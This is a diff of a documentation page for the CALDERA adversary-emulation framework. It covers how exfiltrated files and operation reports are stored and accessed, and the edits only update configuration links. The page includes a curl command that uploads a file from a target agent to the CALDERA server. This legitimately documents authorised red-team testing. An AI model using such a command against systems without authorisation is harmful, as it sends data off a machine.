@@ -1,6 +1,6 @@
 # Exfiltration
 
-After completing an operation a user may want to review the data retreived from the target system. This data is automatically stored on the CALDERA server in a directory specified in [/conf/default.yml](Server-configuration.html#the-existing-default-yml).
+After completing an operation a user may want to review the data retreived from the target system. This data is automatically stored on the CALDERA server in a directory specified in [/conf/default.yml](Server-Configuration.html#configuration-file).
 
 ## Exfiltrating Files
 
@@ -9,11 +9,11 @@ Some abilities will transfer files from the agent to the CALDERA server. This ca
 curl -X POST -F 'data=@/file/path/' http://server_ip:8888/file/upload
 ```
 Note: localhost could be rejected in place of the server IP. In this case you will get error 7. You should type out the full IP.
-These files are sent from the agent to server_ip/file/upload at which point the server places these files inside the directory specified by [/conf/default.yml to key "exfil_dir"](Server-configuration.html#the-existing-default-yml). By default it is set to /tmp/caldera
+These files are sent from the agent to server_ip/file/upload at which point the server places these files inside the directory specified by [/conf/default.yml to key "exfil_dir"](Server-Configuration.html#configuration-file). By default it is set to /tmp/caldera
 
 ## Accessing Exfiltrated Files
 
-The server stores all exfiltrated files inside the directory specified by [/conf/default.yml to key "exfil_dir"](Server-configuration.html#the-existing-default-yml). By default it is set to /tmp/caldera
+The server stores all exfiltrated files inside the directory specified by [/conf/default.yml to key "exfil_dir"](Server-Configuration.html#configuration-file). By default it is set to /tmp/caldera
 
 Files can be accessed by pulling them directly from that location when on the server and manually unencrypting the files.
 
@@ -25,7 +25,7 @@ All downloaded files will be unencrypted before passing along as a download.
 
 ## Accessing Operations Reports
 
-After the server is shut down the reports from operations are placed inside the directory specified by the [/conf/default.yml to key "reports_dir"](Server-configuration.html#the-existing-default-yml). By default it is also set to /tmp
+After the server is shut down the reports from operations are placed inside the directory specified by the [/conf/default.yml to key "reports_dir"](Server-Configuration.html#configuration-file). By default it is also set to /tmp
 
 
 ## Unencrypting the files
